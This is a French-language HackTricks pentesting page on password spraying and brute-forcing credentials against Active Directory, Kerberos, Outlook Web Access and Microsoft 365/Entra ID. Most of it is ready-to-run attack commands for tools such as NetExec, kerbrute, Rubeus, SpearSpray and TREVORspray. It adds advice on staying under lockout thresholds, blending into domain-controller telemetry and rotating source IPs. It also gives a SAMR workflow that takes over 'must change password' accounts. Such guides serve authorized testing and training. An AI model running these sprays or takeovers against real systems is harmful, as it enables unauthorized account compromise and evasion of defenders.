# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Une fois que vous avez trouvé plusieurs **noms d’utilisateur valides**, vous pouvez essayer les **mots de passe les plus courants** (gardez à l’esprit la policy de mot de passe de l’environnement) avec chacun des utilisateurs découverts.\
Par **défaut**, la **longueur minimale** du **mot de passe** est de **7**.

Des listes de noms d’utilisateur courants peuvent aussi être utiles : [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Remarquez que vous **pourriez verrouiller certains comptes si vous essayez plusieurs mauvais mots de passe** (par défaut plus de 10).

### Get password policy

Si vous avez des identifiants d’utilisateur ou un shell en tant qu’utilisateur de domaine, vous pouvez **obtenir la policy de mot de passe avec** :
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation depuis Linux (ou tous)

- En utilisant **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Utiliser **NetExec (successeur de CME)** pour un password spraying ciblé et à faible bruit sur SMB/WinRM :
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- En utilisant [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(vous pouvez indiquer le nombre de tentatives pour éviter les verrouillages) :**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Using [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - PAS TOUJOURS RECOMMANDÉ PARFOIS NE FONCTIONNE PAS
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Avec le module `scanner/smb/smb_login` de **Metasploit** :

![](<../../images/image (745).png>)

- En utilisant **rpcclient** :
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Depuis Windows

- Avec la version de [Rubeus](https://github.com/Zer1t0/Rubeus) avec le module brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Avec [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Il peut générer les utilisateurs du domaine par défaut et récupérera la policy de mot de passe du domaine, puis limitera les tentatives en conséquence):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Avec [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Identifier et prendre le contrôle des comptes "Password must change at next logon" (SAMR)

Une technique à faible bruit consiste à faire du spraying avec un mot de passe bénin/vide et à repérer les comptes renvoyant STATUS_PASSWORD_MUST_CHANGE, ce qui indique que le mot de passe a été forcé à expiration et peut être changé sans connaître l’ancien.

Workflow :
- Énumérer les utilisateurs (RID brute via SAMR) pour construire la liste des cibles :

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Effectuer un password spraying avec un mot de passe vide et continuer en cas de réussite afin de capturer les comptes qui doivent changer le mot de passe au prochain logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Pour chaque résultat, changez le mot de passe via SAMR avec le module de NetExec (aucun ancien mot de passe n'est nécessaire lorsque "must change" est défini) :
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Notes opérationnelles :
- Assurez-vous que l’horloge de votre hôte est synchronisée avec le DC avant les opérations basées sur Kerberos : `sudo ntpdate <dc_fqdn>`.
- Un `[+]` sans `(Pwn3d!)` dans certains modules (par ex. RDP/WinRM) signifie que les identifiants sont valides mais que le compte n’a pas les droits de connexion interactive.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Le spraying basé sur la pre-auth Kerberos réduit le bruit par rapport aux tentatives SMB/NTLM/LDAP bind et s’aligne mieux avec les politiques de lockout AD. SpearSpray combine un ciblage piloté par LDAP, un moteur de patterns, et la prise en compte des politiques (politique de domaine + PSOs + buffer badPwdCount) pour faire du spray de manière précise et sûre. Il peut aussi marquer les principals compromis dans Neo4j pour le pathing BloodHound.

Idées clés :
- Découverte des users via LDAP avec paging et support LDAPS, en utilisant éventuellement des filtres LDAP custom.
- Filtrage tenant compte de la politique de lockout du domaine + PSO pour laisser un buffer d’essais configurable (threshold) et éviter de lock les users.
- Validation de la pre-auth Kerberos en utilisant des bindings gssapi rapides (génère 4768/4771 sur les DCs au lieu de 4625).
- Génération de mots de passe par utilisateur, basée sur des patterns, avec des variables comme les noms et des valeurs temporelles dérivées du pwdLastSet de chaque user.
- Contrôle du débit avec threads, jitter, et un maximum de requêtes par seconde.
- Intégration Neo4j optionnelle pour marquer les users owned pour BloodHound.

Utilisation de base et découverte :
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Ciblage et contrôle des motifs:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Contrôles de discrétion et de sécurité :
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound enrichment:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Vue d'ensemble du système de patterns (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

There are multiples tools for p**assword spraying outlook**.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (fiable !)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

To use any of these tools, you need a user list and a password / a small list of passwords to spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Pour le cloud spraying, identifiez d’abord si le tenant est **managed**, **federated**, ou **hybrid**, car l’endpoint et le comportement de lockout peuvent différer de l’AD on-prem. Dans Microsoft Entra, **Smart Lockout** modifie la manière dont les tentatives répétées consomment le budget de lockout :

- Répéter le **même mauvais mot de passe** n’augmente pas le compteur de lockout, mais essayer de **nouveaux candidats** oui.
- Les emplacements **familiar** et **unfamiliar** ont des compteurs **séparés**.
- Les tenants utilisant **pass-through authentication (PTA)** ne bénéficient pas du suivi des hashs de mauvais mots de passe, donc traitez-les davantage comme des cibles classiques sensibles au lockout.

En pratique, faites du spray avec **un mot de passe par round**, laissez suffisamment d’espace entre les rounds, et privilégiez des outils capables de détecter le flux d’authentification réel du tenant avant d’envoyer des tentatives.

- Avec [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), vous pouvez faire du recon sur le tenant, découvrir le `token_endpoint`, faire du spray sur `msol`/`adfs`/`owa`/`okta`, et faire tourner le trafic via plusieurs egress IPs :
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Avec [**Spray365**](https://github.com/MarkoH17/Spray365), vous pouvez pré-construire un **execution plan** reprisable, randomiser l’ordre d’authentification, et imposer un **minimum delay per user** pour rester en dehors de la fenêtre de lockout :
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- Avec [**o365spray**](https://github.com/0xZDH/o365spray), vous pouvez valider le tenant, énumérer les utilisateurs avec des modules tels que `onedrive`, et faire du spray via `oauth2` ou `adfs` tout en gardant **une tentative par utilisateur** par fenêtre de lockout. Si vous avez déjà une API FireProx, passez-la avec `--proxy-url` pour répartir les IPs sources :
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
La récente technique des opérateurs s’est également orientée vers le **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) prend en charge les fenêtres temporelles, la rotation des mots de passe, le spraying ADFS/M365, et l’exfiltration automatique post-auth. Des abus réels récents ont aussi utilisé l’énumération de comptes via l’**Microsoft Teams API** et la **rotation des régions AWS** pour répartir les vagues de spray sur plusieurs géographies sources.

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
